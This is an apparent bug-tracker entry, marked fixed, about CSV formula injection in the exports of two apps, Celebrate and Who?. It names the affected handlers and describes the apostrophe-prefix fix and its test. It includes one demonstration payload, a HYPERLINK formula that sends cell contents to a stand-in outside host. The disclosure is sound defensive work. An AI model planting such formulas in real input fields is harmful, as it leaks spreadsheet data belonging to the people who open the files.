Description: The CSV files the apps hand out - Celebrate's `invoices.csv` for admins, Who?'s list and invitation exports for members - write names a member or a ticket buyer typed as they are, so a name beginning `=` runs as a formula when the file is opened in a spreadsheet.
Status: fixed
Severity: low
---
`invoicesCSV` (`internal/celebrate/handlers.go`) wrote `l.Guest`, a guest name of up to 120 characters typed at `buyTickets`, straight into the file an admin downloads. `csvField` (`web/who/dom.js`) quoted a field and nothing more, and feeds the exports in `web/who/pages/list.js` and `web/who/pages/invites.js` with preferred names a parent typed and guest names from Celebrate. The sheets themselves are safe: every write in `internal/data/sheet.go` is `RAW`.

A guest named `=HYPERLINK("https://elsewhere.example/?"&A1,"see invoice")` is the demonstration.

Fixed: every cell `invoicesCSV` writes goes through `csvCell`, and `csvField` does the same - a cell starting with `=`, `+`, `-`, `@`, a tab or a carriage return gets a leading `'` unless it parses as a number, so negative quantities and prices stay numbers. `TestCSVCell` holds the rule.
